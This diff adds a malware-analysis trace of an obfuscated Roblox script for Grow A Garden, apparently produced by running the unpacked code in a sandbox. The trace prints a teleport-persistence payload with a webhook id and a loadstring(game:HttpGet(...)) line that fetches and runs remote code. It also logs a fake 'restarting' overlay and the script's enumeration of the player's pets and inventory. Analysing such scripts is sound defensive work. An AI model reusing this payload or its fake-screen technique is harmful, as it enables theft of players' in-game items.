@@ -1,0 +1,117 @@
+# GrowAGarden (reds2) - Luraph v14.4.1 stage-2 - sandboxed behavior trace
+# (instrumented Luau run of the unpacked VM; network/fs stubbed)
+
+## queue_on_teleport persistence payload:
+        Username = "I_usebloxflip"
+        Webhook = "54fbc67d8a449a6811b1bc076be001b8"
+        URL = "_G.URL"
+        loadstring(game:HttpGet("_G.URL"))()
+    
+
+## event trace:
+MISSING_GLOBAL	script
+MISSING_GLOBAL	URL
+Instance.new	ScreenGui
+Instance.new	Frame
+Instance.new	UIListLayout
+Instance.new	ImageLabel
+Instance.new	TextLabel
+Instance.new	TextLabel
+SET	Instance<ScreenGui>.DisplayOrder	inf
+SET	Instance<ScreenGui>.IgnoreGuiInset	true
+SET	Instance<ScreenGui>.Enabled	false
+CALL	game.GetService	game	CoreGui
+SET	Instance<ScreenGui>.Parent	game.GetService()
+CALL	Vector2.new	0.5	0.5
+SET	Instance<Frame>.AnchorPoint	Vector2.new()
+CALL	Color3.fromRGB	0	0	0
+SET	Instance<Frame>.BackgroundColor3	Color3.fromRGB()
+CALL	UDim2.new	0.5	0	0.46	0
+SET	Instance<Frame>.Position	UDim2.new()
+CALL	UDim2.new	1.25	0	1.25	0
+SET	Instance<Frame>.Size	UDim2.new()
+SET	Instance<Frame>.Parent	Instance<ScreenGui>
+SET	Instance<UIListLayout>.SortOrder	Enum.SortOrder.LayoutOrder
+SET	Instance<UIListLayout>.HorizontalAlignment	Enum.HorizontalAlignment.Center
+SET	Instance<UIListLayout>.VerticalAlignment	Enum.VerticalAlignment.Center
+CALL	UDim.new	0	10
+SET	Instance<UIListLayout>.Padding	UDim.new()
+SET	Instance<UIListLayout>.Parent	Instance<Frame>
+CALL	Color3.fromRGB	255	255	255
+SET	Instance<ImageLabel>.BackgroundColor3	Color3.fromRGB()
+SET	Instance<ImageLabel>.BackgroundTransparency	1
+SET	Instance<ImageLabel>.LayoutOrder	1
+CALL	UDim2.new	0.2	100	0.2	100
+SET	Instance<ImageLabel>.Size	UDim2.new()
+SET	Instance<ImageLabel>.Image	rbxassetid://5152571106
+SET	Instance<ImageLabel>.ScaleType	Enum.ScaleType.Fit
+SET	Instance<ImageLabel>.Parent	Instance<Frame>
+CALL	Color3.fromRGB	255	255	255
+SET	Instance<TextLabel>.BackgroundColor3	Color3.fromRGB()
+SET	Instance<TextLabel>.BackgroundTransparency	1
+SET	Instance<TextLabel>.LayoutOrder	3
+CALL	UDim2.new	0.7	0	0.007	15
+SET	Instance<TextLabel>.Size	UDim2.new()
+SET	Instance<TextLabel>.Font	Enum.Font.GothamBlack
+SET	Instance<TextLabel>.Text	Please wait while we redirect you...
+CALL	Color3.fromRGB	255	255	255
+SET	Instance<TextLabel>.TextColor3	Color3.fromRGB()
+SET	Instance<TextLabel>.TextScaled	true
+SET	Instance<TextLabel>.Parent	Instance<Frame>
+CALL	Color3.fromRGB	255	255	255
+SET	Instance<TextLabel>.BackgroundColor3	Color3.fromRGB()
+SET	Instance<TextLabel>.BackgroundTransparency	1
+SET	Instance<TextLabel>.LayoutOrder	2
+CALL	UDim2.new	0.75	0	0.02	20
+SET	Instance<TextLabel>.Size	UDim2.new()
+SET	Instance<TextLabel>.Font	Enum.Font.GothamBlack
+SET	Instance<TextLabel>.Text	We're restarting Grow A Garden!
+CALL	Color3.fromRGB	255	255	255
+SET	Instance<TextLabel>.TextColor3	Color3.fromRGB()
+SET	Instance<TextLabel>.TextScaled	true
+SET	Instance<TextLabel>.Parent	Instance<Frame>
+queue_on_teleport	len=160
+CALL	game.IsLoaded	game
+CALL	game.GetService	game	RobloxReplicatedStorage
+CALL	game.GetService	game	ReplicatedStorage
+CALL	game.GetService	game	CollectionService
+CALL	game.GetService	game	TeleportService
+CALL	game.GetService	game	TextChatService
+CALL	game.GetService	game	HttpService
+CALL	game.GetService	game	RunService
+CALL	game.GetService	game	Players
+CALL	game.GetService().GetServerType.InvokeServer	game.GetService().GetServerType
+CALL	game.GetService().GetPlayers	game.GetService()
+CALL	game.GetService().LocalPlayer.GetAttribute	game.GetService().LocalPlayer	DataFullyLoaded
+CALL	game.GetService().LocalPlayer.GetAttribute	game.GetService().LocalPlayer	Finished_Loading
+CALL	game.GetService().WaitForChild	game.GetService()	GameEvents
+CALL	game.GetService().WaitForChild	game.GetService()	Modules
+CALL	game.GetService().WaitForChild	game.GetService()	Data
+CALL	game.GetService().WaitForChild().WaitForChild	game.GetService().WaitForChild()	DataService
+REQUIRE	game.GetService().WaitForChild().WaitForChild()
+CALL	game.GetService().WaitForChild().WaitForChild	game.GetService().WaitForChild()	CalculatePlantValue
+REQUIRE	game.GetService().WaitForChild().WaitForChild()
+CALL	game.GetService().WaitForChild().WaitForChild	game.GetService().WaitForChild()	CommaFormatNumber
+REQUIRE	game.GetService().WaitForChild().WaitForChild()
+CALL	game.GetService().WaitForChild().WaitForChild	game.GetService().WaitForChild()	NumberUtil
+REQUIRE	game.GetService().WaitForChild().WaitForChild()
+CALL	game.GetService().WaitForChild().WaitForChild	game.GetService().WaitForChild()	PetRegistry
+REQUIRE	game.GetService().WaitForChild().WaitForChild()
+CALL	game.GetService().WaitForChild().WaitForChild	game.GetService().WaitForChild()	PetServices
+CALL	game.GetService().WaitForChild().WaitForChild().WaitForChild	game.GetService().WaitForChild().WaitForChild()	PetUtilities
+REQUIRE	game.GetService().WaitForChild().WaitForChild().WaitForChild()
+CALL	game.GetService().WaitForChild().WaitForChild	game.GetService().WaitForChild()	EnumRegistry
+CALL	game.GetService().WaitForChild().WaitForChild().WaitForChild	game.GetService().WaitForChild().WaitForChild()	InventoryServiceEnums
+REQUIRE	game.GetService().WaitForChild().WaitForChild().WaitForChild()
+CALL	game.GetService().WaitForChild().WaitForChild	game.GetService().WaitForChild()	EnumRegistry
+CALL	game.GetService().WaitForChild().WaitForChild().WaitForChild	game.GetService().WaitForChild().WaitForChild()	ItemTypeEnums
+REQUIRE	game.GetService().WaitForChild().WaitForChild().WaitForChild()
+CALL	game.GetService().LocalPlayer.Character.WaitForChild	game.GetService().LocalPlayer.Character	Humanoid
+CALL	game.GetService().LocalPlayer.CharacterAdded.Connect	game.GetService().LocalPlayer.CharacterAdded	function: 0x0000558ee0c162c0
+CALL	game.GetService().GetTagged	game.GetService()	PetTargetable
+CALL	game.GetService().LocalPlayer.Backpack.GetChildren	game.GetService().LocalPlayer.Backpack
+CALL	game.GetService().LocalPlayer.Character.GetChildren	game.GetService().LocalPlayer.Character
+RESULT	true	nil
+FIRING_CALLBACKS	1
+CALL	FiredEvent.WaitForChild	FiredEvent	Humanoid
+CB_RESULT	1	true	nil
